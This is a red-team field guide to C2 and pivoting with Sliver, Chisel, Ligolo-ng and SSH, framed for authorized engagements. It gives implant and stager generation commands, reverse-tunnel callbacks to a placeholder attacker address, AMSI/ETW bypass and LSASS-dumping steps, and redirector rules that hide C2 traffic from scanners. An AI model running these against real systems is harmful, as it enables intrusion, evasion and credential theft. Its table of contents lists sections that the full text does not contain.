# The C2 & Pivoting Field Guide
## Sliver + Tailscale + Chisel + Ligolo-ng — From Home Lab to Authorized Real-World Engagements

Red teaming and penetration testing rely on Command and Control (C2) frameworks to manage authorized access to test endpoints. Catching a shell is only the first step. In real engagements, high-value targets sit behind internal networks, segmented subnets, egress filters, proxies, and mature monitoring — and a pipeline that works in a lab will often die in minutes against a real SOC unless the infrastructure behind it is built deliberately.
 
This guide covers the full pipeline using free, open-source tools:

- **Sliver** – Open-source C2 with sessions, beacons, native port forwarding, SOCKS5, stagers, and Armory
- **Tailscale** – Secure WireGuard mesh for *your own* operator infrastructure
- **Chisel** – Lightweight HTTP-tunneled SOCKS5 proxy
- **Ligolo-ng** – TUN-based tunneling for full subnet access

**What makes this an engagement-grade guide rather than a pure lab guide:** infrastructure architecture (redirectors, domains, certificates, firewalls), HTTP(S) profile customization, implant OPSEC on the endpoint, evidence handling, artifact tracking, teardown discipline, and blue-team detection validation.

Everything in this document is written for **authorized environments only**: personal labs, training ranges, and formally approved assessments with written permission. Do not use these techniques against systems without explicit written authorization.

New to all of this? Start with **Appendix A: Lab Quick-Start**, then come back for the engagement-grade layers.

---

## Table of Contents

0. [Before You Touch a Keyboard: Authorization and Engagement Hygiene](#0-before-you-touch-a-keyboard-authorization-and-engagement-hygiene)
1. [Architecture: Lab vs. Engagement-Grade](#1-architecture-lab-vs-engagement-grade)
2. [Operator Infrastructure with Tailscale](#2-operator-infrastructure-with-tailscale)
3. [Sliver: Install, Multiplayer, Armory](#3-sliver-install-multiplayer-armory)
4. [Listeners, Implants, Beacons, Stagers](#4-listeners-implants-beacons-stagers)
5. [Engagement-Grade C2 Infrastructure](#5-engagement-grade-c2-infrastructure)
6. [Implant OPSEC on the Endpoint](#6-implant-opsec-on-the-endpoint)
7. [Pivoting I: Sliver Native Forwarding](#7-pivoting-i-sliver-native-forwarding)
8. [Pivoting II: Chisel SOCKS5](#8-pivoting-ii-chisel-socks5)
9. [Pivoting III: Ligolo-ng for Full Subnet Access](#9-pivoting-iii-ligolo-ng-for-full-subnet-access)
10. [Pivoting IV: SSH Reverse Forwarding](#10-pivoting-iv-ssh-reverse-forwarding)
11. [Evidence, Artifact Tracking, and Reporting](#11-evidence-artifact-tracking-and-reporting)
12. [Teardown and Cleanup](#12-teardown-and-cleanup)
13. [Detection Engineering Appendix](#13-detection-engineering-appendix)
14. [Troubleshooting](#14-troubleshooting)
15. [Tool Comparison](#15-tool-comparison)
16. [Checklists](#16-checklists)
17. [Further Reading](#17-further-reading)
18. [Conclusion](#18-conclusion)

Appendix A. [Lab Quick-Start](#appendix-a-lab-quick-start)

---

## 0. Before You Touch a Keyboard: Authorization and Engagement Hygiene

Every real engagement starts with paperwork, not payloads. Before any infrastructure is stood up:

- **Signed, written authorization** — scope (IP ranges, domains, facilities), test window, permitted techniques, and explicitly out-of-scope systems.
- **Rules of Engagement (ROE)** — what you may and may not do: persistence allowed? credential dumping allowed? denial-of-service techniques? data exfiltration limits?
- **Deconfliction** — the client's security team contact, SOC escalation path, and an emergency-stop procedure. Confirm how the client will distinguish your traffic from a real attacker (IP lists, tool notification windows, or engagement "canaries").
- **Evidence agreement** — how findings, screenshots, captured credentials, and artifacts will be stored, transmitted, and destroyed after the engagement.
- **A teardown plan written before you start** — you will be asked to prove every artifact you placed on the network was removed. Keep the ledger described in Part 11 from minute one.

If any of these do not exist, you are not ready to operate.

---

## 1. Architecture: Lab vs. Engagement-Grade

The single biggest difference between a lab pipeline and a real one is that **the team server is never directly exposed to the internet**. In a lab, your Sliver server can listen on `0.0.0.0` and implants can call straight back. In an engagement, implants call a **redirector** (or a CDN in front of one), and only the redirector is allowed to talk to the team server. If the redirector gets burned, you replace it in minutes and the operation survives.

```text
        LAB (simple)                        ENGAGEMENT-GRADE (segmented)
┌─────────────────────┐         ┌──────────────────────────────────────────────┐
│ Attack machine      │         │ Operators ── Tailscale mesh ──┐              │
│  Sliver server      │         │                               ▼              │
│  listens 0.0.0.0    │         │              Team server (no public ports)   │
└─────────┬───────────┘         │               Sliver, bound to localhost /   │
          │                      │               internal interface only       │
          ▼                      │                          ▲                   │
┌─────────────────────┐         │             internal net  │                   │
│ Compromised gateway │         │                          ▼                   │
│  implant calls back │         │              HTTPS redirector (Caddy/Nginx)  │
│  directly           │         │              aged, categorized domain        │
└─────────┬───────────┘         │              valid TLS cert, decoy content   │
          │                      │                          ▲                   │
          ▼                      │                    (optional CDN layer)     │
┌─────────────────────┐         │                          ▲                   │
│ Isolated subnet     │         │                 Target implant callback      │
│  10.10.20.0/24      │         └──────────────────────────────────────────────┘
└─────────────────────┘
```

**Segment infrastructure by function and lifespan.** A common professional model:

| Stage | Purpose | Lifespan | Examples |
|---|---|---|---|
| Initial access | First code execution, payload hosting | Hours to days | Short-lived stager host, phishing infra (if authorized) |
| Long-haul C2 | Persistent, low-and-slow control | Weeks | HTTPS beacon listener + redirector |
| Interactive ops | Hands-on-keyboard work, pivoting | Minutes to hours | Sessions, SOCKS, Ligolo tunnels |
| Exfiltration / demo | Proof of data access | Hours | Staged, documented, minimized |

Discovery of one stage should never compromise another: separate domains, separate providers, separate IPs and certificates for each function.

---

## 2. Operator Infrastructure with Tailscale

Tailscale creates a private WireGuard mesh between your own machines. In an engagement-grade setup, this is how **operators** reach the team server console — so the team server's operator port never needs to be exposed publicly.

```bash
curl -fsSL https://tailscale.com/install.sh | sh
sudo tailscale up
tailscale ip -4
```

Use the resulting `100.x.x.x` addresses only for connectivity among your own operator and infrastructure systems.

> **Critical note:** A target that is not enrolled in your tailnet cannot reach `100.x.x.x` addresses. Use an address reachable from the target — a redirector domain (preferred), a lab VPN address, or an authorized public address — for implant and agent callbacks. Adding a target to Tailscale changes the test environment substantially and is generally unnecessary for this workflow.

---

## 3. Sliver: Install, Multiplayer, Armory

### Install a pinned release

The one-liner `curl https://sliver.sh/install | sudo bash` builds from source and does not pin a release. For reproducible results (lab or engagement), download a specific prebuilt release and record the version in your engagement notes:

```bash
mkdir -p ~/tools/sliver
# Check https://github.com/BishopFox/sliver/releases for the current tag
wget -q https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-server_linux -O ~/tools/sliver/sliver-server
wget -q https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-client_linux -O ~/tools/sliver/sliver-client
chmod +x ~/tools/sliver/sliver-server ~/tools/sliver/sliver-client
~/tools/sliver/sliver-server
```

(First server start unpacks assets — allow a few minutes. Always pin whatever tag is current when you build; v1.7.3 is shown as an example.)

### Server/client split and multiplayer

Run `sliver-server` separately and connect with `sliver-client`. This prevents a stray `Ctrl+C` in your console from killing the operation and enables team operations. The client connects to the server over gRPC (default port **31337**) — this is the port you will restrict to your tailnet in Part 5.

```sliver
# On the server
multiplayer
new-operator -n <name> -l <server-tailnet-ip>
```

```bash
# On each operator machine
./sliver-client import <name>_<server-ip>.cfg
./sliver-client
```

Without `multiplayer` enabled on the server, clients cannot connect. If a client hangs at "Connecting to…", verify multiplayer is on and the operator config's IP matches a reachable interface.

### Armory

Sliver Armory provides extensions and aliases for common .NET-based and BOF assessment utilities. Review each package and its licensing before installation; extensions may create processes or artifacts on the target.

```sliver
armory                       # list everything
armory search seatbelt       # search
armory install seatbelt      # install one
```

Common installs for an AD engagement: `seatbelt` (host enumeration), `sharpup` (privesc checks), `rubeus` (Kerberos), `sharphound-4` (BloodHound collection), `certify` (ADCS), `nanodump` (LSASS, BOF). Installed extensions become top-level commands; run `<cmd> --help` for arguments.

> **Note:** If Armory operations fail in the client, try the same command from the server component. Use `execute-assembly --help` to review process-hosting and runtime options for your pinned version.

---

## 4. Listeners, Implants, Beacons, Stagers

### Choose the transport for the environment

| Transport | Command | Best for | Notes |
|---|---|---|---|
| HTTPS | `https --domain <domain>` | **Real engagements** — blends with web egress | Pair with a redirector; customize `http-c2.json` |
| HTTP | `http` | Lab / testing | Cleartext; trivially logged |
| mTLS | `mtls --lhost ... --lport 8888` | Labs, interactive sessions | Long-lived TLS to a nonstandard port is anomalous on real networks |
| DNS | `dns --domains c2.example.com` | Heavily filtered egress | Slow; DNS analytics will see it; beacon traffic only |
| WireGuard | `wg --lhost ... --lport 51820` | Fast lab pivot transport | Needs UDP egress |
| Named pipe | `pivots named-pipe` | Internal chaining on Windows | Windows only; see Part 7 |

For real-world work, the default answer is **HTTPS on 443 through a redirector on an aged, categorized domain**. mTLS on port 8888 is primarily a lab pattern — on a real network, a long-lived TLS session from a workstation to a raw VPS IP on a nonstandard port is exactly what SOC behavioral analytics look for.

### Generate implants

```sliver
# Session implant (interactive) — lab / mTLS
generate --mtls ATTACKER_REACHABLE_IP:8888 --os windows --arch amd64 --save /tmp/implant.exe --skip-symbols

# Beacon (async) — engagement default
generate beacon --https cdn.example-c2.com --os windows --arch amd64 --seconds 300 --jitter 150 --save /tmp/beacon.exe -N beacon1
```

**Beacon timing for real engagements:** a 60-second interval with 30 jitter is lab tempo. For long-dwell work use minutes-to-hours intervals with large jitter, and understand that jitter does not defeat behavioral detection — modern NDR/behavioral products detect the *pattern* of check-ins regardless of jitter. Vary intervals; avoid tight fixed cadences.

**Multiple callback domains** (resilience if one domain is blocked):

```sliver
generate beacon --http cdn1.example-c2.com,cdn2.example-c2.net --seconds 300 --jitter 150
```

The implant tries each domain in order, loops on `--reconnect` (default 60s), and terminates after `--max-errors` (default 1000).

**URL path prefixes** (essential when a redirector filters by path — see Part 5):

```sliver
generate beacon --http https://cdn.example-c2.com/assets ...
```

Every request URL will be prefixed with `/assets`, so your redirector can whitelist `/assets/*` and send everything else to a decoy.

> **Build note:** `--skip-symbols` skips Go symbol obfuscation — faster and smaller builds, but leaves more recognizable Go/Sliver strings for static analysis. Compare builds in a lab:
>
> ```bash
> strings implant.exe | grep -i sliver | tail -10
> ```

**Pivoting tip:** Prefer **sessions** over beacons when deploying Chisel or Ligolo agents and when using interactive Sliver functionality (`shell`, `socks5`, `rportfwd`). Beacons execute work asynchronously and can be unsuitable for long-running interactive tasks. If you only have a beacon, run `interactive` first to upgrade it to a session — then drop back to the beacon to reduce your footprint when done.

### Profiles and stagers

Profiles save a reusable implant blueprint so you generate identical builds repeatedly:

```sliver
profiles new --http https://cdn.example-c2.com/assets --format shellcode beacon_profile
profiles generate --name beacon_profile -N beacon2
```

When delivery size is constrained (e.g., a file-size-limited upload), use a stager: a small first stage that pulls the full implant from a stage-listener and runs it in memory:

```sliver
profiles new --http https://cdn.example-c2.com/assets --format shellcode stage_profile
stage-listener --url https://cdn.example-c2.com/assets --profile stage_profile
generate stager --http https://cdn.example-c2.com/assets --arch amd64 --os windows -o /tmp/stager.bin
```

> **OPSEC warning:** Stage-listener URLs are static artifacts. A defender who recovers a stager can replay the URL and fetch your payload — so treat every stage URL as **burned on sight**. Never reuse a stage URL across engagements or across targets, stand the stager host up only for initial access, and destroy it immediately after. It is Stage-0 infrastructure: disposable by definition.

---

## 5. Engagement-Grade C2 Infrastructure

This is the part that separates a lab guide from a field guide. Team server exposure, domain quality, and traffic filtering determine whether your operation survives contact with a SOC.

### 5.1 Domains: buy, age, categorize

A domain registered the day before the engagement gets flagged by NGFWs and threat intel feeds. Professional practice:

- **Age:** use domains aged at least ~6 months. Either buy months in advance and host benign content, or buy expired domains that previously served legitimate purposes.
- **Categorization:** security products categorize by content type. Get your domain categorized as something trusted (Technology, Business, Health, Finance) by hosting believable content and submitting to categorization services (Bluecoat/Symantec, zvelo, TrustedSource). Verify with VirusTotal.
- **Blacklist check before buying:** a single flag on any major vendor blacklist (McAfee, Fortiguard, Palo Alto, Sophos, Trend Micro, Brightcloud) makes the domain useless. Check with MXToolbox or equivalent.
- **Separation:** never share a domain across functions — one domain for C2, another for payload delivery, another for phishing (if authorized). One burned domain should cost you one function, not the operation.
- **Prefer registrars with WHOIS privacy** and no keyword blocking; Cloudflare is a common choice.

### 5.2 Team server hardening

The team server should have **no public-facing ports except SSH from operator IPs**. If operators connect over Tailscale, everything else can be locked to the tailnet interface:

```bash
# Allow operators (over tailnet) to reach the Sliver gRPC console (default 31337)
sudo ufw allow in on tailscale0 to any port 31337 proto tcp

# SSH only from operator IPs or tailnet
sudo ufw allow from <operator-ip> to any port 22 proto tcp

# If the redirector runs on a SEPARATE box, allow only it to reach the C2 port:
sudo ufw allow from <redirector-ip> to any port 443 proto tcp

sudo ufw default deny incoming
sudo ufw enable
```

Also harden SSH (key-only auth, no root login), and — before the engagement — scan your own infrastructure from the outside (nmap, Shodan, Censys) to confirm nothing is exposed that shouldn't be. Treat any accidental team-server exposure as a burned server.

### 5.3 Redirectors: Caddy or Nginx in front of Sliver

The redirector terminates TLS on your categorized domain, forwards matching requests to Sliver, and shows everyone else a decoy. **Bind Sliver's HTTP listener to localhost** so it is only reachable through the redirector:

```sliver
# Sliver: listen only on loopback
http -L 127.0.0.1 -l 8081
```

**Caddy** (automatic Let's Encrypt certificates, simple config):

```bash
sudo apt install -y caddy
```

`/etc/caddy/Caddyfile`:

```text
cdn.example-c2.com {
	# Only forward traffic that matches the implant's path prefix
	@c2 path /assets/*

	# Send obvious scanners to the decoy
	@scanners header_regexp User-Agent (?i)(masscan|nmap|zgrab|nikto|sqlmap|curl|wget|python-requests)
	redir @scanners https://www.example-legit-site.com/ 302

	# C2 traffic -> Sliver on loopback
	reverse_proxy @c2 127.0.0.1:8081

	# Everyone else gets the decoy site
	root * /var/www/decoy
	file_server
}
```

```bash
caddy validate --config /etc/caddy/Caddyfile
sudo systemctl reload caddy
```

**Nginx** alternative (more manual, more control):

```nginx
server {
    listen 443 ssl;
    server_name cdn.example-c2.com;

    ssl_certificate     /etc/letsencrypt/live/cdn.example-c2.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn.example-c2.com/privkey.pem;
    server_tokens off;

    # Layer 1: block scanner/bot user agents (redirect, don't 403 —
    # a 403 tells a scanner it was noticed; a 302 to a legit site tells it nothing)
    if ($http_user_agent ~* "(masscan|nmap|zgrab|nikto|sqlmap|curl|wget|python-requests|googlebot|bingbot|spider|crawler)") {
        return 302 https://www.example-legit-site.com/;
    }

    # Layer 2: only the implant's URL prefix reaches Sliver
    location /assets/ {
        proxy_pass http://127.0.0.1:8081;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $remote_addr;
    }

    # Layer 3: everything else is a decoy website
    location / {
        root /var/www/decoy;
        index index.html;
        try_files $uri $uri/ =404;
    }
}
```

Obtain certificates with Certbot:

```bash
sudo apt install -y certbot python3-certbot-nginx
sudo certbot --nginx -d cdn.example-c2.com
sudo certbot renew --dry-run
```

**Filtering layers, in professional practice** (stack as many as your environment needs):

1. **User-agent filtering** — scanners and threat-intel crawlers get a 302 to a plausible external site, never an error.
2. **Custom header check** — add a secret header to every implant request (via `http-c2.json`, below); the redirector forwards only requests carrying it. This defeats naive replay of your URL.
3. **URI prefix validation** — forward only the path prefix you baked into the implant; everything else is decoy content.
4. **IP blocklists** — redirect known scanner, threat-intel, and cloud-security-vendor IP ranges to the decoy. Community-maintained redirect rulesets exist as starting points.

**Testing the full chain** (do this before every engagement):

```bash
# Should redirect to the decoy external site (look for the Location header)
curl -A "curl" https://cdn.example-c2.com/ -sI | grep -i location

# Should serve decoy content (200, not a Sliver response)
curl -A "Mozilla/5.0" https://cdn.example-c2.com/ -sI

# Should reach Sliver through the redirector
curl -A "Mozilla/5.0" https://cdn.example-c2.com/assets/whatever.js -sI
```

**Optional CDN layer:** pointing the domain through a CDN (Cloudflare proxy, Azure CDN, CloudFront) means callbacks resolve to trusted provider IP ranges instead of your VPS, and hides the origin IP. If you use it, disable caching for the C2 paths (a cached beacon response breaks check-ins) and validate that your secret header and path filters still behave through the CDN.

### 5.4 Decoy content in Sliver itself

When Sliver terminates TLS directly (no redirector — lab, or a simple short engagement), Sliver can host a decoy website on the same listener, and C2 messages are answered before decoy content is checked:

```sliver
websites --website fake-blog --web-path / --content ./index.html add
https --domain cdn.example-c2.com --lets-encrypt --website fake-blog
```

Sliver's `https` listener can auto-provision Let's Encrypt certificates (`--lets-encrypt`) or use your own `--cert`/`--key` pair.

### 5.5 Customizing HTTP(S) traffic: `http-c2.json`

Sliver procedurally generates each HTTP request (randomized URLs, query parameters, and per-message-type file extensions) from the profile at `~/.sliver/configs/http-c2.json`. **Edit this file before generating any implants** — changing it afterward breaks compatibility with implants already built. Key fields:

```json
{
  "implant_config": {
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "headers": [
      { "name": "X-Session-Token", "value": "<long-random-secret>", "probability": 100 },
      { "name": "Accept-Language", "value": "en-US,en;q=0.9", "probability": 90 }
    ],
    "url_parameters": [
      { "name": "utm_source", "value": "newsletter", "probability": 40 }
    ],
    "max_paths": 8,
    "min_paths": 2,
    "poll_file_ext": ".js",
    "session_file_ext": ".php"
  },
  "server_config": {
    "random_version_headers": true,
    "headers": [
      { "name": "X-Powered-By", "value": "PHP/7.4.3", "probability": 100 }
    ],
    "cookies": ["PHPSESSID", "SESSIONID"]
  }
}
```

The `X-Session-Token` style header is what your redirector's Layer-2 check matches. Make the value long and random, and rotate it per engagement. Each implant embeds only a random subset of the profile, so two implants from the same server can generate dissimilar URLs.

### 5.6 Rotation and infrastructure lifecycle

- Rotate redirectors roughly every 7–14 days on active engagements; keep the team server and its data untouched behind them. Automate provisioning (Terraform/Ansible) so a replacement takes minutes.
- Treat staging/payload-hosting servers as disposable: stand up for initial access, destroy immediately after.
- Log redirector traffic (access logs) so you can tell *what scanned you* and tighten filters.
- Self-check your infrastructure against Shodan/Censys/VirusTotal before and during the engagement — anything that shows up there is a burned component.

---

## 6. Implant OPSEC on the Endpoint

Sliver is designed to be flexible, not invisible. Know the signals you leave, and treat them as expected alerts in monitored environments rather than surprises.

**Binary characteristics**

- Implants are large, unsigned Go executables (often 10 MB+) that are not in any software inventory. Application whitelisting (AppLocker/WDAC) will block them outright; signature-based AV will flag known builds. Staged/in-memory delivery and custom loaders are how operators deal with this — in scope only where ROE permits evasion testing.
- `--skip-symbols` = smaller, faster builds with more recognizable strings. Symbol obfuscation = slower builds, fewer strings. Decide deliberately, per environment.

**Process and memory signals**

- `execute-assembly` runs a .NET assembly in memory via a **sacrificial process** — default `notepad.exe`. A text editor spawning the .NET CLR is a classic EDR signal. Change it: `execute-assembly --process <plausible-host-binary> /path/Tool.exe <args>`.
- Useful flags: `-i` runs in-process (faster; an assembly crash can kill the implant), `-E` attempts an ETW bypass, `-M` attempts an AMSI bypass. Armory aliases apply these automatically. Match assembly architecture (x86/x64) to the implant, and raise the timeout (`-t 240`) for long-running assemblies.
- **Prefer BOFs** (Beacon Object Files — Armory installs several) for common tasks: they run in-process inside the implant, spawning no new process. `nanodump` over `procdump`; a domain-info BOF over a PowerShell one-liner.
- **LSASS access is high-signal.** Any credential dumping from `lsass.exe` (procdump, nanodump, hashdump) should be expected to alert where EDR is mature. Dump off-host (`procdump --save` writes the dump to *your* machine, not the target disk) and parse offline with pypykatz.
- `shell` drops into recognizable PowerShell command-line patterns; service creation produces Windows Event ID 7045; Sliver's named pipes follow recognizable `\\.\pipe\` patterns. Sigma rules exist for all of these — see Part 13.

**Network signals**

- Long-lived mTLS sessions to nonstandard ports: anomalous. Use HTTPS/443 through your redirector.
- Beacon check-in cadence: detectable by behavioral analytics regardless of jitter. Slow down, vary, and assume the SOC *will* eventually see the pattern in a mature environment.
- Your redirector/CDN IP and domain will eventually be reputation-checked by the client's proxies. This is normal; rotation is the answer.

**Operational discipline**

- Minimum tooling for the objective. Every binary on disk is an artifact you must document and remove.
- No persistence unless the ROE explicitly allows it — and if you create it, ledger it (Part 11).
- Write nothing to well-known temp locations (`C:\Windows\Tasks`) in monitored environments unless you are deliberately testing detections; in a lab it's convenient, in production it's a finding.
- Run `execute-assembly` from a plausible process, keep the working set small, and clean up after yourself.

---

## 7. Pivoting I: Sliver Native Forwarding

> These commands require an active **session**, not a beacon. If you are in a beacon context, run `interactive` first.

### Reverse port forward

```sliver
rportfwd add --bind 127.0.0.1:9000 --remote 127.0.0.1:3389
```

```bash
xfreerdp /v:127.0.0.1:9000 /u:<user> /p:'<password>' /cert:ignore
```

> Command flags vary between Sliver versions — confirm with `rportfwd add -h`.

### Built-in SOCKS5

```sliver
socks5 start -P 1080
```

```bash
ss -lntp | grep 1080   # verify the listener on the attack machine
```

In-band proxying may be less reliable for sustained or high-volume traffic. For broad routing, use a TUN-based approach (Ligolo-ng, Part 9).

### Named-pipe pivots (Windows internal chaining)

When an internal host cannot egress but SMB between hosts is allowed, chain implants through the first host:

```sliver
# On an established Windows session (Host A)
pivots named-pipe --bind academy

# Implant for Host B, connecting to A's pipe
generate --named-pipe 127.0.0.1/pipe/academy -N pipe_academy --skip-symbols
```

The second implant still needs an **authorized delivery path to Host B** — for example, an SMB share on Host A that Host B can reach, or an upload over A's session followed by a permitted lateral-transfer method. Host A must also be able to reach Host B over SMB for the pipe chain to work. Once executed on Host B, the implant relays through A's existing channel — no egress from Host B required. Windows only.

---

## 8. Pivoting II: Chisel SOCKS5

### Option A: Standalone binary

```bash
./chisel server --reverse -p 8080 -v --socks5
```

Upload and start the client on the authorized Windows target (**session required**):

```sliver
upload /path/to/chisel.exe C:/Windows/Tasks/chisel.exe
shell
```

> **Lab shorthand:** `C:\Windows\Tasks\` keeps examples short and predictable. In monitored environments, choose an authorized, plausible location instead — see Part 6.

```cmd
C:\Windows\Tasks\chisel.exe client ATTACKER_REACHABLE_IP:8080 R:socks
```

### Option B: Chisel as a Sliver extension

Not a built-in Sliver feature — relies on a third-party extension (e.g., [MrAle98's Chisel fork](https://github.com/MrAle98/chisel)). Review its source, licensing, and behavior in an isolated lab before use.

```bash
git clone https://github.com/MrAle98/chisel
cd chisel/
mkdir -p ~/.sliver-client/extensions/chisel
cp extension.json ~/.sliver-client/extensions/chisel/
make windowsdll_64
make windowsdll_32
cp chisel.x64.dll chisel.x86.dll ~/.sliver-client/extensions/chisel/
```

Restart the Sliver client after installing the extension, then from a session:

```sliver
chisel client ATTACKER_REACHABLE_IP:1337 R:socks
chisel list
chisel stop <task-id>
```

### Proxychains

`/etc/proxychains4.conf`:

```text
socks5 127.0.0.1 1080
```

```bash
proxychains4 nmap -sT -Pn -p 445,3389 10.10.20.5
proxychains4 nxc smb 10.10.20.0/24
```

> The upstream Chisel project receives limited updates. Pin a known version, test it, and prefer Ligolo-ng when you have a choice — it needs no Proxychains and is less fragile in practice.

---

## 9. Pivoting III: Ligolo-ng for Full Subnet Access

**Requirements:** the Ligolo proxy needs root or `CAP_NET_ADMIN` on the proxy host to create TUN interfaces.

### Modern workflow (v0.8+)

```bash
sudo ./proxy --selfcert --laddr 0.0.0.0:11601
```

Upload and start the agent on the authorized target (**session required**):

```sliver
upload /path/to/agent.exe C:/Windows/Tasks/agent.exe
shell
```

> Same as Chisel: `C:\Windows\Tasks\` is lab shorthand; choose an authorized location in monitored environments (Part 6).

```cmd
C:\Windows\Tasks\agent.exe -connect ATTACKER_REACHABLE_IP:11601 -ignore-cert -retry
```

In the Ligolo console:

```text
session
autoroute
```

> **⚠ Routing-loop / reachability warning**
>
> Do **not** route the pivot host's own subnet through the tunnel if the pivot lives in that subnet. This creates a circular dependency that immediately kills the agent connection.
>
> **Concrete example:** if the pivot is `10.10.20.5` and you route `10.10.20.0/24` through Ligolo, traffic to `10.10.20.5` is sent into the tunnel — but the tunnel itself depends on reaching `10.10.20.5`. The connection drops.
>
> **Safer approach:**
>
> ```bash
> ip route get <agent-reachable-ip>           # verify first
> sudo ip route add 10.10.20.10/32 dev ligolo # specific hosts only
> ```

### Classic workflow (v0.6-style fallback)

```bash
sudo ip tuntap add user "$USER" mode tun ligolo
sudo ip link set ligolo up
```

```text
session
interface_create --name ligolo
tunnel_start --tun ligolo
route_add --route 10.10.20.0/24
```

> Command names and aliases vary by Ligolo-ng release; confirm with `help`. v0.8 also adds daemon mode, a WebUI, and auto-bind capabilities.

Once routed, your tools run natively — no Proxychains:

```bash
nmap -sT -Pn --unprivileged -p 445,80,3389,22 10.10.20.0/24
nxc smb 10.10.20.5 -u '<user>' -p '<password>'
```

Ligolo-ng also supports listeners that bind a port on the attack machine and forward through the tunnel — check the installed version's help for syntax.

---

## 10. Pivoting IV: SSH Reverse Forwarding

Modern Windows installs include an OpenSSH client. When outbound SSH is permitted, you can request a reverse SOCKS proxy with no extra binary on the target.

On the attack machine, set a listening port in `/etc/ssh/sshd_config`:

```text
Port 2222
```

```bash
sudo sshd -t
sudo systemctl restart ssh
ss -lntp | grep 2222
```

From the authorized Windows host:

```powershell
ssh -R 1080 <your-username>@ATTACKER_REACHABLE_IP -p 2222
```

If the server permits remote dynamic forwarding, this opens a SOCKS listener on `1080` on your machine. Verify it exists before configuring Proxychains:

```bash
ss -lntp | grep 1080
```

Then `proxychains4 nxc smb 10.10.20.5 ...`

> Requires an interactive login on the pivot host, permitted outbound SSH, and server-side support for the requested forwarding. `AllowTcpForwarding` must not be disabled in `sshd_config`.

---

## 11. Evidence, Artifact Tracking, and Reporting

Real assessments are delivered as reports backed by evidence. Build this habit from the first minute:

**Engagement journal** — a running log, in UTC, of every action: time, operator, target host, action, result. Sliver's server-side logs and operator activity records back you up, but your journal is the primary narrative.

**Artifact ledger** — every change you make on a target, tracked for removal. This is non-negotiable; it is what you hand the client at teardown:

| Time (UTC) | Host | Action | Artifact | Location | Removed? |
|---|---|---|---|---|---|
| 14:22 | WEB01 | implant dropped | beacon1.exe | `C:\Windows\Tasks\` | ☐ |
| 15:03 | WEB01 | proxy client uploaded | chisel.exe | `C:\Windows\Tasks\` | ☐ |
| 16:40 | DC01 | scheduled task created | "SysHelper" | schtasks | ☐ |
| 17:12 | — | stage-listener opened | https://cdn…/assets | infra | ☐ |

**Loot handling** — Sliver's loot store (`download --loot`) keeps collected files server-side with names and timestamps. Handle captured credentials per the evidence agreement: encrypted at rest, need-to-know access, destroyed or returned per contract after the engagement.

**Evidence for findings** — screenshots with visible timestamps, command output, and the exact commands used. A finding you cannot evidence did not happen.

**Reporting structure that works:** executive summary → attack narrative (initial access → escalation → lateral movement → objective) → findings with severity, evidence, and remediation → artifact ledger appendix → detection gaps observed (what did and didn't fire — clients pay for this).

---

## 12. Teardown and Cleanup

Execute the teardown plan you wrote before starting. Order matters: **persistence → implants → listeners → tunnels → infrastructure.**

**On targets:**

```sliver
# Remove persistence you created (ledger items) — scheduled tasks, run keys, services, accounts
# Delete every uploaded binary listed in the artifact ledger
# Then kill implants
kill <session/beacon-id>
```

**In Sliver:**

```sliver
socks5 stop
rportfwd list
rportfwd rm <id>
jobs
kill <job-id>
```

**Tunnels:**

```text
# Ligolo console
tunnel_stop
route_del --route 10.10.20.0/24
ifconfig_del --name ligolo
```

```bash
# Chisel: stop the client task on the target (chisel list; chisel stop <id>) and the local server
```

**Infrastructure:**

- Destroy redirector and staging VPS instances; do not merely stop them.
- Export and preserve engagement logs/evidence per the contract; destroy the rest.
- Release or age-out domains; revoke certificates; rotate every secret (operator configs, `http-c2.json` header values, SSH keys) before the next engagement.

**Verification:** re-scan in-scope hosts to confirm your artifacts are gone, and walk the artifact ledger with the client line by line. Stale TUN interfaces, routes, and listeners on *your* side are also classic causes of confusion in later runs — clean your own house too.

---

## 13. Detection Engineering Appendix

Use this to help the client validate detections — not to bypass monitoring.

**Endpoint (where EDR/Sysmon is deployed)**

- Sliver `shell` functionality produces recognizable PowerShell command-line patterns; Sigma-style process-creation detections exist.
- Process injection and unusual privilege enablement generate remote-thread and privilege telemetry.
- Service creation produces Windows Event ID **7045**, sometimes with distinctive service names or temp-path patterns.
- `execute-assembly`: sacrificial process (default `notepad.exe`) loading the .NET CLR; a text editor with outbound TLS is a classic correlation alert (Sysmon EID 1 + 3).
- Sliver named pipes follow recognizable `\\.\pipe\` naming patterns.
- LSASS process-memory access (any tool) is a high-fidelity EDR signal.
- Unsigned large Go binaries are trivially caught by application whitelisting (AppLocker/WDAC).

**Network**

- Beacon check-in cadence is detectable by behavioral/NDR analytics *even with jitter and encoder rotation* — modern detection is pattern-based, not signature-based. Build the client's detection story around behavior, not just IoCs.
- TLS fingerprinting (JA3/JA3S) can identify client stacks regardless of domain or certificate; Zeek and Suricata extract these in real time.
- Self-check your own infrastructure on Shodan/Censys/VirusTotal during the engagement — anything indexed there is an IOC the client (and real attackers' threat intel) can find.

**SIEM correlation**

- Baseline user/service behavior; alert on workstations making outbound TLS to recently-registered or uncategorized domains.
- Correlate process execution with network flows: `notepad.exe` (or any implausible binary) making outbound HTTPS.
- Stream authentication logs: token impersonation, `getsystem`-style escalation, and lateral WinRM/SMB all leave audit trails.

**Deliverable:** a detection-gap section in your report listing which techniques fired alerts and which did not — that is often the most valuable part of an engagement for the client.

---

## 14. Troubleshooting

| Symptom | Likely cause / fix |
|---|---|
| Implant never calls back | No matching listener running (`jobs`), wrong callback address, or egress blocked. Confirm the callback host/port is reachable from the target |
| Client hangs at "Connecting to…" | `multiplayer` not enabled, or operator config IP doesn't match a reachable server interface |
| `shell` unavailable or unsuitable | You are on a beacon; run `interactive` first |
| Forwarding or SOCKS command fails | Requires a session; run `interactive` |
| Beacon tasks never complete | Interval too long or C2 blocked; lower `--seconds`, verify egress, try HTTPS on 443 |
| `execute-assembly` shows no output | Timeout too short (`-t 240`), arch mismatch, or `-i` crash — drop `-i`, match architectures |
| Implant AV-killed on drop | Unsigned Go binary flagged; use stager/in-memory delivery per ROE |
| Build takes very long | Symbol obfuscation; `--skip-symbols` for faster (noisier) builds |
| Redirector: beacon 404s / never connects | Path prefix mismatch between implant (`--http .../assets`) and redirector location block; or Sliver not bound where the redirector proxies |
